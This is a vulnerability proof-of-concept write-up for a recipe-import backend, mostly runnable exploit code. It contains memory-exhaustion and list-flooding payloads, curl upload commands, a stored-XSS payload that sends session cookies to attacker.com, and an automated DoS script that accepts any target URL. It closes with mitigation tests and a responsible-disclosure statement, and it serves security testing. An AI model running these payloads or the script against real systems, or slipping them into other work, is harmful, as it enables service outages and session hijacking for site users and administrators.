# Vulnerability Proof of Concept (POC)

This document demonstrates exploitable vulnerabilities found in the BrewSignal Recipe Format implementation.

---

## POC 1: Type Coercion Bypass (CRITICAL)

### Vulnerability
Pydantic auto-converts string inputs to float without validation, allowing type confusion attacks.

### Exploit Code
```python
from backend.services.brewsignal_format import BrewSignalRecipe

# ATTACK: Send strings instead of numbers
malicious_recipe = BrewSignalRecipe(
    name="Type Confusion Attack",
    og="1.050",  # String instead of float
    fg="1.010"   # String instead of float
)

print(f"Attack successful!")
print(f"  og type: {type(malicious_recipe.og)}")  # Output: <class 'float'>
print(f"  og value: {malicious_recipe.og}")       # Output: 1.05
```

### Execution
```bash
$ python3 -c "from backend.services.brewsignal_format import BrewSignalRecipe; \
recipe = BrewSignalRecipe(name='Test', og='1.050', fg='1.010'); \
print(f'og={recipe.og}, type={type(recipe.og)}')"

og=1.05, type=<class 'float'>
```

### Impact
- Bypasses type safety
- Could lead to data integrity issues if string contains malicious content
- Inconsistent validation behavior

### Expected Behavior
```python
ValidationError: og must be numeric type, got str
```

---

## POC 2: Memory Exhaustion via Unbounded Text Field (CRITICAL)

### Vulnerability
The `notes` field has no maximum length, allowing arbitrary memory allocation.

### Exploit Code
```python
from backend.services.brewsignal_format import BrewSignalRecipe

# ATTACK: Send 100 MB notes field
massive_notes = "A" * (100 * 1024 * 1024)  # 100 MB

malicious_recipe = BrewSignalRecipe(
    name="DoS Attack",
    og=1.050,
    fg=1.010,
    notes=massive_notes
)

print(f"Attack successful! Allocated {len(malicious_recipe.notes)} bytes")
# Output: Attack successful! Allocated 104857600 bytes
```

### Exploit via API
```bash
# Create malicious JSON file
python3 << 'EOF'
import json

# 100 MB notes field
payload = {
    "brewsignal_version": "1.0",
    "recipe": {
        "name": "DoS Attack",
        "og": 1.050,
        "fg": 1.010,
        "notes": "A" * (100 * 1024 * 1024)
    }
}

with open("malicious_recipe.json", "w") as f:
    json.dump(payload, f)
EOF

# Upload to server (will cause OOM)
curl -X POST http://localhost:8080/api/recipes/import \
  -F "file=@malicious_recipe.json" \
  -H "Content-Type: multipart/form-data"
```

### Impact
- Single request allocates 100+ MB of memory
- 10 concurrent requests = 1 GB memory exhaustion
- Causes Out-of-Memory (OOM) kills
- Database bloat from storing massive text fields

### Expected Behavior
```python
ValidationError: notes must be at most 10000 characters
```

---

## POC 3: List-Based DoS Attack (CRITICAL)

### Vulnerability
Ingredient lists have no size limits, allowing mass object creation.

### Exploit Code
```python
from backend.services.brewsignal_format import (
    BrewSignalRecipe,
    BrewSignalFermentable,
    BrewSignalHop,
    BrewSignalTiming
)

# ATTACK: Create recipe with 50,000 fermentables
print("Generating 50,000 fermentables...")
fermentables = [
    BrewSignalFermentable(name=f"Malt_{i}", amount_kg=0.1)
    for i in range(50_000)
]

print("Generating 50,000 hops...")
hops = [
    BrewSignalHop(
        name=f"Hop_{i}",
        amount_grams=1.0,
        timing=BrewSignalTiming(use="add_to_boil")
    )
    for i in range(50_000)
]

print("Creating malicious recipe...")
malicious_recipe = BrewSignalRecipe(
    name="List DoS Attack",
    og=1.050,
    fg=1.010,
    fermentables=fermentables,
    hops=hops
)

print(f"Attack successful!")
print(f"  Total ingredients: {len(malicious_recipe.fermentables) + len(malicious_recipe.hops)}")
# Output: Total ingredients: 100000
```

### Database Impact
```python
# Simulate database insertion
import asyncio
from backend.database import get_db
from backend.services.importers.recipe_importer import RecipeImporter

# This would create 100,000+ database rows in a single transaction
# Causing:
# - Transaction timeout
# - Lock contention
# - Disk space exhaustion
# - Database crash
```

### Impact
- Memory exhaustion from large object graphs
- Database bloat (100,000+ rows per recipe)
- Slow JSON serialization (minutes for 100K items)
- ORM N+1 query amplification

### Expected Behavior
```python
ValidationError: Maximum 100 items allowed per ingredient type
```

---

## POC 4: Deeply Nested Extensions - Stack Exhaustion (MEDIUM)

### Vulnerability
No depth limit on nested dictionaries in `brewsignal_extensions`.

### Exploit Code
```python
from backend.services.brewsignal_format import BrewSignalRecipe

# ATTACK: Create 1000-level deep nesting
print("Creating deeply nested structure...")
nested = {"level_0": {}}
current = nested["level_0"]

for i in range(1, 1000):
    current[f"level_{i}"] = {}
    current = current[f"level_{i}"]

print("Attempting to create recipe...")
malicious_recipe = BrewSignalRecipe(
    name="Deep Nesting Attack",
    og=1.050,
    fg=1.010,
    brewsignal_extensions=nested
)

print(f"Attack successful! Created {1000}-level deep nesting")

# Now try to serialize it (may cause stack overflow)
import json
try:
    json_str = json.dumps(malicious_recipe.model_dump())
    print(f"Serialization succeeded (JSON length: {len(json_str)} bytes)")
except RecursionError:
    print("EXPLOIT SUCCESSFUL: RecursionError during serialization")
```

### Impact
- Potential stack overflow in JSON serializers
- Performance degradation during deep recursion
- Database JSON field storage inefficiency

### Expected Behavior
```python
ValidationError: Maximum nesting depth of 10 exceeded
```

---

## POC 5: XSS via Stored Malicious Content (MEDIUM)

### Vulnerability
HTML/JavaScript code accepted and stored in text fields.

### Exploit Code
```python
from backend.services.brewsignal_format import BrewSignalRecipe

# ATTACK: Store XSS payload in recipe notes
xss_payload = """
<script>
  // Steal session cookies
  fetch('https://attacker.com/steal?cookie=' + document.cookie);

  // Deface the page
  document.body.innerHTML = '<h1>HACKED!</h1>';
</script>
"""

malicious_recipe = BrewSignalRecipe(
    name="<img src=x onerror=alert('XSS')>",
    author="<script>alert('XSS')</script>",
    og=1.050,
    fg=1.010,
    notes=xss_payload
)

print("XSS payload stored successfully!")
print(f"  Name: {malicious_recipe.name}")
print(f"  Notes: {malicious_recipe.notes[:50]}...")
```

### Frontend Vulnerability (if not escaped)
```svelte
<!-- VULNERABLE CODE (example) -->
<script>
  export let recipe;
</script>

<!-- WRONG: Direct HTML injection -->
<div>{@html recipe.notes}</div>

<!-- When recipe.notes contains: -->
<!-- <script>alert('XSS')</script> -->
<!-- Result: XSS executes in user's browser -->
```

### Attack Vector
1. Attacker uploads malicious recipe via API
2. Recipe stored in database with XSS payload
3. Admin views recipe in dashboard
4. XSS executes, stealing admin session

### Impact
- Stored XSS (persistent across page loads)
- Session hijacking
- Admin account takeover
- Data exfiltration

### Expected Behavior
```python
# Backend strips HTML
recipe.notes = "alertXSS"  # <script> tags removed

# OR frontend properly escapes
<div>
  &lt;script&gt;alert('XSS')&lt;/script&gt;  <!-- Escaped, safe -->
</div>
```

---

## POC 6: File Upload Size Bypass

### Vulnerability
File upload limited to 1 MB, but individual fields can approach this limit.

### Exploit Code
```bash
# Create JSON file just under 1 MB limit
python3 << 'EOF'
import json

# 900 KB notes field
payload = {
    "brewsignal_version": "1.0",
    "recipe": {
        "name": "Size Bypass",
        "og": 1.050,
        "fg": 1.010,
        "notes": "A" * (900 * 1024)  # 900 KB
    }
}

with open("bypass.json", "w") as f:
    json.dump(payload, f)

import os
size_mb = os.path.getsize("bypass.json") / (1024 * 1024)
print(f"File size: {size_mb:.2f} MB (under 1 MB limit)")
EOF

# Upload succeeds despite large field
curl -X POST http://localhost:8080/api/recipes/import \
  -F "file=@bypass.json" \
  -H "Content-Type: multipart/form-data"
```

### Impact
- File size limit ineffective
- Large database entries
- Memory pressure during processing

---

## Combined Attack: Multi-Vector DoS

### Exploit Code
```python
from backend.services.brewsignal_format import (
    BrewSignalRecipe,
    BrewSignalFermentable
)

# COMBINED ATTACK: All DoS vectors at once
print("Launching multi-vector DoS attack...")

# Vector 1: Massive notes field (10 MB)
notes = "A" * (10 * 1024 * 1024)

# Vector 2: Massive fermentables list (10,000 items)
fermentables = [
    BrewSignalFermentable(name=f"Malt_{i}", amount_kg=0.1)
    for i in range(10_000)
]

# Vector 3: Deep nesting (100 levels)
nested = {"a": {}}
current = nested["a"]
for i in range(100):
    current[str(i)] = {}
    current = current[str(i)]

# Create malicious recipe
malicious_recipe = BrewSignalRecipe(
    name="Multi-Vector DoS",
    og=1.050,
    fg=1.010,
    notes=notes,
    fermentables=fermentables,
    brewsignal_extensions=nested
)

print(f"Attack successful!")
print(f"  Notes size: {len(malicious_recipe.notes) / 1024 / 1024:.2f} MB")
print(f"  Fermentables: {len(malicious_recipe.fermentables)}")
print(f"  Extension nesting: 100 levels")
print(f"  Estimated memory: ~50 MB per recipe")
print(f"  Impact: 10 concurrent uploads = 500 MB memory exhaustion")
```

---

## Automated Exploit Script

Save as `exploit.py`:

```python
#!/usr/bin/env python3
"""
Automated exploit for BrewSignal Recipe Format vulnerabilities.
For security testing purposes only.
"""
import requests
import json
import sys

def exploit_dos(url):
    """Send DoS attack to recipe import endpoint."""
    print("[*] Generating DoS payload...")

    payload = {
        "brewsignal_version": "1.0",
        "recipe": {
            "name": "DoS Attack",
            "og": 1.050,
            "fg": 1.010,
            "notes": "A" * (10 * 1024 * 1024),  # 10 MB
            "fermentables": [
                {"name": f"Malt_{i}", "amount_kg": 0.1}
                for i in range(1000)
            ]
        }
    }

    print(f"[*] Payload size: {sys.getsizeof(json.dumps(payload)) / 1024 / 1024:.2f} MB")
    print(f"[*] Sending attack to {url}...")

    try:
        response = requests.post(
            f"{url}/api/recipes/import",
            files={"file": ("attack.json", json.dumps(payload))},
            timeout=30
        )

        if response.status_code == 500:
            print("[+] SUCCESS: Server crashed (500 error)")
        elif response.status_code == 201:
            print("[+] SUCCESS: Malicious recipe accepted!")
        else:
            print(f"[-] FAILED: {response.status_code} - {response.text[:100]}")

    except requests.exceptions.Timeout:
        print("[+] SUCCESS: Server timeout (DoS effective)")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_url>")
        print("Example: python3 exploit.py http://localhost:8080")
        sys.exit(1)

    target = sys.argv[1]
    exploit_dos(target)
```

Run with:
```bash
python3 exploit.py http://localhost:8080
```

---

## Mitigation Verification

After applying fixes, these exploits should fail:

```python
# Test type validation
try:
    recipe = BrewSignalRecipe(name="Test", og="1.050", fg=1.010)
    print("FAIL: Type coercion still works")
except ValidationError:
    print("PASS: Type validation working")

# Test size limits
try:
    recipe = BrewSignalRecipe(
        name="Test", og=1.050, fg=1.010,
        notes="A" * 20_000  # Exceeds 10K limit
    )
    print("FAIL: Size limit bypass")
except ValidationError:
    print("PASS: Size limit enforced")

# Test list limits
try:
    from backend.services.brewsignal_format import BrewSignalFermentable
    fermentables = [
        BrewSignalFermentable(name=f"M_{i}", amount_kg=0.1)
        for i in range(200)  # Exceeds 100 limit
    ]
    recipe = BrewSignalRecipe(
        name="Test", og=1.050, fg=1.010,
        fermentables=fermentables
    )
    print("FAIL: List limit bypass")
except ValidationError:
    print("PASS: List limit enforced")
```

---

## Responsible Disclosure

These vulnerabilities have been identified through authorized security testing. All exploits are documented for remediation purposes only.

**DO NOT use these exploits against production systems without explicit authorization.**
